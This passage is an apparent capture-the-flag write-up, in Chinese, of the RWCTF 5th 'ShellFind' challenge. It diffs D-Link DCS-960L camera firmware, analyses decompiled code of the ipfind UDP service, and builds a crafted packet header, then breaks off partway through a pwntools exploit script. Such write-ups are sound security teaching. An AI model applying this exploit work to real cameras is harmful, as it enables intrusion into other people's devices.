<!DOCTYPE html><html lang="en"><head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="RWCTF 5th ShellFind复现笔记 题目类型为Pwn，难度描述为 difficulty:Normal，具体描述如下： 12345678910111213Hello Hacker.You don't know me, but I know you.I want to play a game. Here's what happens if you lose.The device you a">
<meta property="og:type" content="article">
<meta property="og:title" content="RWCTF 5th ShellFind复现笔记">
<meta property="og:url" content="http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="z1r0's blog">
<meta property="og:description" content="RWCTF 5th ShellFind复现笔记 题目类型为Pwn，难度描述为 difficulty:Normal，具体描述如下： 12345678910111213Hello Hacker.You don't know me, but I know you.I want to play a game. Here's what happens if you lose.The device you a">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1.png">
<meta property="og:image" content="http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/2.png">
<meta property="article:published_time" content="2023-04-10T08:10:59.000Z">
<meta property="article:modified_time" content="2023-08-17T06:33:48.637Z">
<meta property="article:author" content="z1r0">
<meta property="article:tag" content="RW">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>RWCTF 5th ShellFind复现笔记</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="z1r0's blog" type="application/atom+xml">
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.1.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/04/19/%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/03/30/CH341A%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;text=RWCTF 5th ShellFind复现笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;title=RWCTF 5th ShellFind复现笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;is_video=false&amp;description=RWCTF 5th ShellFind复现笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RWCTF 5th ShellFind复现笔记&amp;body=Check out this article: http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;title=RWCTF 5th ShellFind复现笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;title=RWCTF 5th ShellFind复现笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;title=RWCTF 5th ShellFind复现笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;title=RWCTF 5th ShellFind复现笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;name=RWCTF 5th ShellFind复现笔记&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;t=RWCTF 5th ShellFind复现笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">RWCTF 5th ShellFind复现笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%BF%9C%E7%A8%8B%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">题目远程环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">初步分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-40172C"><span class="toc-number">1.3.1.</span> <span class="toc-text">sub_40172C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-4013F4"><span class="toc-number">1.3.2.</span> <span class="toc-text">sub_4013F4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-400F50"><span class="toc-number">1.3.3.</span> <span class="toc-text">sub_400F50</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.4.</span> <span class="toc-text">固件模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.7.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        RWCTF 5th ShellFind复现笔记
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">z1r0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-04-10T08:10:59.000Z" itemprop="datePublished">2023-04-10</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WP/">WP</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/RW/" rel="tag">RW</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="RWCTF-5th-ShellFind复现笔记"><a href="#RWCTF-5th-ShellFind复现笔记" class="headerlink" title="RWCTF 5th ShellFind复现笔记"></a>RWCTF 5th ShellFind复现笔记</h1><blockquote>
<p>题目类型为Pwn，难度描述为 difficulty:Normal，具体描述如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Hello Hacker.</span><br><span class="line">You don't know me, but I know you.</span><br><span class="line">I want to play a game. Here's what happens if you lose.</span><br><span class="line">The device you are watching is hooked into your Saturday and Sunday.</span><br><span class="line">When the timer in the back goes off,</span><br><span class="line">your curiosity will be permanently ripped open.</span><br><span class="line">Think of it like a reverse bear trap.</span><br><span class="line">Here, I'll show you.</span><br><span class="line">There is only one UDP service to shell the device.</span><br><span class="line">It's in the stomach of your cold firmware.</span><br><span class="line">Look around Hacker. Know that I'm not lying.</span><br><span class="line">Better hurry up.</span><br><span class="line">Shell or out, make your choice.</span><br></pre></td></tr></tbody></table></figure>

<p>题目文件：<a target="_blank" rel="noopener" href="https://github.com/Larryxi/rwctf-5th-shellfind">https://github.com/Larryxi/rwctf-5th-shellfind</a></p>
</blockquote>
<h2 id="题目远程环境配置"><a href="#题目远程环境配置" class="headerlink" title="题目远程环境配置"></a>题目远程环境配置</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run --name shellfind -d --privileged -p 4444/udp --<span class="built_in">rm</span> 1arry/shellfind</span><br></pre></td></tr></tbody></table></figure>

<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>首先把题目给的固件解包，然后发现是D-link DCS 960L，再从官网上下载个最新的固件</p>
<p>最新的固件下载链接：<a target="_blank" rel="noopener" href="https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L">https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L</a></p>
<p>下载之后直接diff比较一下，最大的差距是下面这个</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Binary files squashfs-root/usr/sbin/ipfind and squashfs-root2/usr/sbin/ipfind differ</span><br></pre></td></tr></tbody></table></figure>

<p>刚好ipfind是udp服务，符合题目描述，所以对这两个文件进行分析</p>
<p>用bindiff查看一下，发现<code>401ca4</code>这个地方被手动patch过了，属于<code>40172C</code>函数</p>
<p><img src="/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1.png" alt="1"></p>
<p>现在初步分析之后确定ipfind程序为目标程序</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先完整分析一下ipfind，首先是下面这个部分</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ifname = argv[<span class="number">1</span>];</span><br><span class="line">    v4 = ipfind_pid() &lt; <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    {</span><br><span class="line">      setup_signal_handlers();</span><br><span class="line">      server_sockfd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">17</span>);         <span class="comment">// udp</span></span><br><span class="line">      <span class="keyword">if</span> ( server_sockfd == <span class="number">-1</span> )</span><br><span class="line">      {</span><br><span class="line">        my_puts(<span class="string">"Can't get server socket\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br></pre></td></tr></tbody></table></figure>

<p>如果ipfind正常运行</p>
<ul>
<li>注册信号处理函数</li>
<li>创建udp套接字</li>
</ul>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v12.sa_family = <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v12.sa_data[<span class="number">2</span>], <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">        *v12.sa_data = <span class="number">62720</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(v13, ifname, <span class="number">0x10</span>u);</span><br><span class="line">        <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">25</span>, v13, <span class="number">0x20</span>u) &gt;= <span class="number">0</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">32</span>, &amp;v9, <span class="number">4u</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">4</span>, &amp;v10, <span class="number">4u</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">            {</span><br><span class="line">              <span class="keyword">if</span> ( bind(server_sockfd, &amp;v12, <span class="number">0x10</span>u) &gt;= <span class="number">0</span> )</span><br><span class="line">              {</span><br></pre></td></tr></tbody></table></figure>

<p>如果套接字创建成功，则绑定到62720端口上</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> {</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> sa_family; <span class="comment">/* address family, AF_xxx */</span></span><br><span class="line"><span class="type">char</span> sa_data[<span class="number">14</span>]; <span class="comment">/* 14 bytes of protocol address */</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>

<p>sa_family为2代表是udp，sa_data=62720则代表要绑定到62720端口上</p>
<p>如果绑定成功就到了最核心的地方</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">sub_4013D0(<span class="string">"IPFind start(%s)...\n"</span>, ifname);</span><br><span class="line">        v18 = user_data;</span><br><span class="line">        v21 = &amp;user_data[<span class="number">17</span>];</span><br><span class="line">        addr_len = &amp;v11;</span><br><span class="line">        v20 = <span class="string">"FIVI"</span>;</span><br><span class="line">        v22 = &amp;v16;</span><br><span class="line">        v23 = &amp;unk_402E90;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          v5 = &amp;v14;</span><br><span class="line">          <span class="keyword">if</span> ( dword_413168 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          {</span><br><span class="line">            *v5 = <span class="number">0</span>;</span><br><span class="line">            v5 += <span class="number">4</span>;</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">while</span> ( v5 != user_data );</span><br><span class="line">          v6 = server_sockfd;</span><br><span class="line">          v14.__fds_bits[server_sockfd &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; server_sockfd;</span><br><span class="line">          <span class="keyword">if</span> ( select(v6 + <span class="number">1</span>, &amp;v14, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( ((v14.__fds_bits[server_sockfd &gt;&gt; <span class="number">5</span>] &gt;&gt; server_sockfd) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            {</span><br><span class="line">              v11 = <span class="number">16</span>;</span><br><span class="line">              <span class="built_in">memset</span>(user_data, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">              recvfrom(server_sockfd, user_data, <span class="number">0x800</span>u, <span class="number">0</span>, &amp;client_addr, addr_len);</span><br><span class="line">              *&amp;user_data[<span class="number">4</span>] = (*&amp;user_data[<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) | user_data[<span class="number">4</span>] | ((*&amp;user_data[<span class="number">4</span>] &amp; <span class="number">0xFF0000</span>u) &gt;&gt; <span class="number">8</span>) | ((*&amp;user_data[<span class="number">4</span>] &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">              v7 = ((_byteswap_ushort(*&amp;user_data[<span class="number">9</span>]) &lt;&lt; <span class="number">8</span>) | ((user_data[<span class="number">10</span>] | (user_data[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>));</span><br><span class="line">              *&amp;user_data[<span class="number">9</span>] = v7;</span><br><span class="line">              *&amp;user_data[<span class="number">11</span>] = (_byteswap_ushort(*&amp;user_data[<span class="number">11</span>]) &lt;&lt; <span class="number">8</span>) | ((user_data[<span class="number">12</span>] | (user_data[<span class="number">11</span>] &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">              v8 = ((_byteswap_ushort(*&amp;user_data[<span class="number">23</span>]) &lt;&lt; <span class="number">8</span>) | ((user_data[<span class="number">24</span>] | (user_data[<span class="number">23</span>] &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>));</span><br><span class="line">              *&amp;user_data[<span class="number">23</span>] = v8;</span><br><span class="line">              v17 = (*&amp;user_data[<span class="number">25</span>] &lt;&lt; <span class="number">24</span>) | user_data[<span class="number">25</span>] | ((*&amp;user_data[<span class="number">25</span>] &amp; <span class="number">0xFF0000</span>u) &gt;&gt; <span class="number">8</span>) | ((*&amp;user_data[<span class="number">25</span>] &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">              *&amp;user_data[<span class="number">25</span>] = v17;</span><br><span class="line">              <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v18, v20, <span class="number">4u</span>) &amp;&amp; user_data[<span class="number">8</span>] == <span class="number">10</span> )</span><br><span class="line">              {</span><br><span class="line">                <span class="keyword">if</span> ( v7 == <span class="number">1</span> )</span><br><span class="line">                {</span><br><span class="line">                  <span class="keyword">if</span> ( !v8 &amp;&amp; !<span class="built_in">memcmp</span>(v21, v23, <span class="number">6u</span>) &amp;&amp; !v17 )</span><br><span class="line">                    sub_40172C(user_data);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">2</span></span><br><span class="line">                       &amp;&amp; net_get_hwaddr(ifname, v22) &gt;= <span class="number">0</span></span><br><span class="line">                       &amp;&amp; !<span class="built_in">memcmp</span>(v21, v22, <span class="number">6u</span>)</span><br><span class="line">                       &amp;&amp; *&amp;user_data[<span class="number">25</span>] == <span class="number">142</span> )</span><br><span class="line">                {</span><br><span class="line">                  sub_4013F4(user_data, <span class="number">142</span>);</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br></pre></td></tr></tbody></table></figure>

<p><code>recvfrom(server_sockfd, user_data, 0x800u, 0, &amp;client_addr, addr_len);</code></p>
<ul>
<li>最大接收0x800个数据到user_data中</li>
</ul>
<p>如果满足一些条件，会进入<code>sub_40172C</code>函数和<code>sub_40172C</code>函数</p>
<ul>
<li><p><code>!strncmp(v18, v20, 4u)</code></p>
<ul>
<li>v18和v20要相等，v20是<code>FIVI</code>，v18是<code>user_data</code>起始的数据，所以第一步<code>user_data = 'FIVI'</code></li>
</ul>
</li>
<li><p><code>user_data[8] == 10</code></p>
<ul>
<li>第9个数要为<code>'\n'</code>，所以<code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n'</code></li>
</ul>
</li>
<li><p><code>v7 == 1</code></p>
<ul>
<li><code>((_byteswap_ushort(*&amp;user_data[9]) &lt;&lt; 8) | ((user_data[10] | (user_data[9] &lt;&lt; 8)) &gt;&gt; 8)) == 1</code></li>
<li>当user_data[9] = 0x1，user_data[10] = 0的时候满足这个条件</li>
<li>也就是<code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00'</code></li>
</ul>
</li>
<li><p><code>!memcmp(v21, v23, 6u)</code></p>
<ul>
<li>v21和v23要相等，v23是<code>0xff * 6</code>，这里其实就是mac_addr</li>
<li><code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6</code></li>
</ul>
</li>
<li><p>!v8</p>
<ul>
<li>v8要为0，<code>v8 = ((_byteswap_ushort(*&amp;user_data[23]) &lt;&lt; 8) | ((user_data[24] | (user_data[23] &lt;&lt; 8)) &gt;&gt; 8))</code></li>
<li>23和24都为0的时候v8就为0</li>
<li><code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6 + '\x00\x00'</code></li>
</ul>
</li>
<li><p>!v17</p>
<ul>
<li>v17要为0，<code>v17 = (*&amp;user_data[25] &lt;&lt; 24) | user_data[25] | ((*&amp;user_data[25] &amp; 0xFF0000u) &gt;&gt; 8) | ((*&amp;user_data[25] &amp; 0xFF00) &lt;&lt; 8)</code></li>
<li>当25为0就可以满足条件</li>
<li><code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6 + '\x00\x00' + '\x00'</code></li>
</ul>
</li>
</ul>
<p>所以进入<code>sub_40172C</code>函数的开头是</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p1 = b<span class="number">'F</span>IVI<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\x00\x00\x00\x00<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\n<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\x01\x00<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\x00\x00\x00\x00\x00\x00<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\xff<span class="number">'</span> * <span class="number">6</span></span><br><span class="line">p1 += b<span class="number">'</span>\x00\x00<span class="number">'</span></span><br><span class="line">p1 += b<span class="number">'</span>\x00<span class="number">'</span></span><br></pre></td></tr></tbody></table></figure>

<p>现在写一个连接脚本，并发送p1</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'mips'</span>, endian=<span class="string">'big'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'192.168.10.200'</span></span><br><span class="line">port = <span class="number">62720</span></span><br><span class="line"></span><br><span class="line">r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">lg(<span class="string">'[+] open connection'</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'FIVI'</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\n'</span></span><br><span class="line">p1 += <span class="string">b'\x01\x00'</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\xff'</span> * <span class="number">6</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p1 